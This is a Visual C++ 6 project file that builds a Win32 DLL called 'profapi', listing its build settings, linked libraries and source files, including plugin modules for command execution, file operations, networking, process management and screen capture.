# Microsoft Developer Studio Project File - Name="profapi" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Dynamic-Link Library" 0x0102

CFG=profapi - Win32 Debug
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "profapi.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "profapi.mak" CFG="profapi - Win32 Debug"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "profapi - Win32 Debug" (based on "Win32 (x86) Dynamic-Link Library")
!MESSAGE "profapi - Win32 Release" (based on "Win32 (x86) Dynamic-Link Library")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "profapi - Win32 Debug"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 1
# PROP BASE Output_Dir "..\..\build\debug\prof"
# PROP BASE Intermediate_Dir "..\..\build\debug\prof"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 1
# PROP Output_Dir "..\..\build\debug\prof"
# PROP Intermediate_Dir "..\..\build\debug\prof"
# PROP Target_Dir ""
# ADD BASE CPP /nologo /MDd /W3 /Gm /GX /ZI /Od /I "../../common" /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /D "_USRDLL" /D "SVRCTRLDLL_EXPORTS" /D "_UNICODE" /YX /GZ /c
# ADD CPP /nologo /MDd /W3 /Gm /GX /ZI /Od /I "../../common" /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /D "_USRDLL" /D "SVRCTRLDLL_EXPORTS" /D "_UNICODE" /YX /GZ /c
# ADD BASE MTL /nologo /win32
# ADD MTL /nologo /win32
# ADD BASE RSC /l 0x409
# ADD RSC /l 0x409
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib libconnD.lib ws2_32.lib Netapi32.lib Rpcrt4.lib Iphlpapi.lib /nologo /subsystem:windows /dll /debug /machine:IX86 /def:"svrCtrlDll.def" /pdbtype:sept /libpath:"../../libs"
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib libconnD.lib ws2_32.lib Netapi32.lib Rpcrt4.lib Iphlpapi.lib /nologo /subsystem:windows /dll /debug /machine:IX86 /def:"svrCtrlDll.def" /pdbtype:sept /libpath:"../../libs"

!ELSEIF  "$(CFG)" == "profapi - Win32 Release"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "..\..\build\release\prof"
# PROP BASE Intermediate_Dir "..\..\build\release\prof"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "..\..\build\release\prof"
# PROP Intermediate_Dir "..\..\build\release\prof"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /MD /W3 /GX /Os /Ob2 /Gy /I "../../common" /I "../allPlugins" /D "TRIVAL" /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_USRDLL" /D "SVRCTRL_EXPORTS" /D "_MBCS" PRECOMP_VC7_TOBEREMOVED /c
# ADD CPP /nologo /MD /W3 /GX /Os /Ob2 /Gy /I "../../common" /I "../allPlugins" /D "TRIVAL" /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_USRDLL" /D "SVRCTRL_EXPORTS" /D "_MBCS" PRECOMP_VC7_TOBEREMOVED /c
# ADD BASE MTL /nologo /win32
# ADD MTL /nologo /win32
# ADD BASE RSC /l 0x409
# ADD RSC /l 0x409
BSC32=bscmake.exe
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib winmm.lib kernel32.lib user32.lib gdi32.lib zlib.lib Netapi32.lib Rpcrt4.lib Iphlpapi.lib libconn2.lib /nologo /subsystem:windows /dll /machine:IX86 /nodefaultlib:"libcmt.lib" /def:"profapi.def" /out:"..\..\bin\$(ProjectName)0.dll" /pdbtype:sept /libpath:"../../libs" /opt:ref /opt:icf
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib winmm.lib kernel32.lib user32.lib gdi32.lib zlib.lib Netapi32.lib Rpcrt4.lib Iphlpapi.lib libconn2.lib /nologo /subsystem:windows /dll /machine:IX86 /nodefaultlib:"libcmt.lib" /def:"profapi.def" /out:"..\..\bin\profapi0.dll" /pdbtype:sept /libpath:"../../libs" /opt:ref /opt:icf

!ENDIF 

# Begin Target

# Name "profapi - Win32 Debug"
# Name "profapi - Win32 Release"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx"
# Begin Source File

SOURCE=.\profapi.cpp
# End Source File
# Begin Source File

SOURCE=.\profapi.def
# End Source File
# Begin Source File

SOURCE=.\stdafx.cpp

!IF  "$(CFG)" == "profapi - Win32 Debug"

# ADD CPP /nologo /GX /Yc"stdafx.h" /GZ

!ELSEIF  "$(CFG)" == "profapi - Win32 Release"

# ADD CPP /nologo /GX /Yc"stdafx.h"

!ENDIF 

# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl;inc;xsd"
# Begin Source File

SOURCE=.\resource.h
# End Source File
# Begin Source File

SOURCE=.\stdafx.h
# End Source File
# Begin Source File

SOURCE=.\targetver.h
# End Source File
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav"
# Begin Source File

SOURCE=.\svrCtrlDll.rc
# End Source File
# End Group
# Begin Group "allPlugins"

# PROP Default_Filter ""
# Begin Source File

SOURCE=..\allPlugins\audio.cpp
# End Source File
# Begin Source File

SOURCE=..\allPlugins\audio.h
# End Source File
# Begin Source File

SOURCE=..\allPlugins\audioMgr.cpp
# End Source File
# Begin Source File

SOURCE=..\allPlugins\audioMgr.h
# End Source File
# Begin Source File

SOURCE=..\allPlugins\execCmd.cpp
# End Source File
# Begin Source File

SOURCE=..\allPlugins\execCmd.h
# End Source File
# Begin Source File

SOURCE=..\allPlugins\fileOperation.cpp
# End Source File
# Begin Source File

SOURCE=..\allPlugins\fileOperation.h
# End Source File
# Begin Source File

SOURCE=..\allPlugins\network.cpp
# End Source File
# Begin Source File

SOURCE=..\allPlugins\processMgr.cpp
# End Source File
# Begin Source File

SOURCE=..\allPlugins\processMgr.h
# End Source File
# Begin Source File

SOURCE=..\allPlugins\queryInfo.cpp
# End Source File
# Begin Source File

SOURCE=..\allPlugins\queryInfo.h
# End Source File
# Begin Source File

SOURCE=..\allPlugins\screen.cpp
# End Source File
# Begin Source File

SOURCE=..\allPlugins\screen.h
# End Source File
# Begin Source File

SOURCE=..\allPlugins\ScreenSpy.cpp
# End Source File
# Begin Source File

SOURCE=..\allPlugins\ScreenSpy.h
# End Source File
# Begin Source File

SOURCE=..\allPlugins\svrctrl.h
# End Source File
# Begin Source File

SOURCE=..\allPlugins\WjcDes.cpp
# End Source File
# Begin Source File

SOURCE=..\allPlugins\WjcDes.h
# End Source File
# End Group
# Begin Source File

SOURCE=.\ReadMe.txt
# End Source File
# End Target
# End Project
